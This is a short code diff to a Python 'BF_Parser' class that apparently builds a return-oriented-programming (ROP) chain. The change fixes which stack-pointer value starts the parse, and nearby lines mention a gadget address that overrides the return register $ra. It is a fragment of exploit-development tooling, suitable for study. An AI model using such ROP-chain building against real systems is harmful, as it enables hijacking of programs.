@@ -77,7 +77,7 @@ class BF_Parser():
     def parse(self, pointer_start, initial_sp):
         addr_mask = 0x3fffffffff # to restore the address using only the lower 32 bits
 
-        current_sp = pointer_start # acts like a program counter
+        current_sp = initial_sp # acts like a program counter
 
         # initialize a3 to point to the middle of the tape
         rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
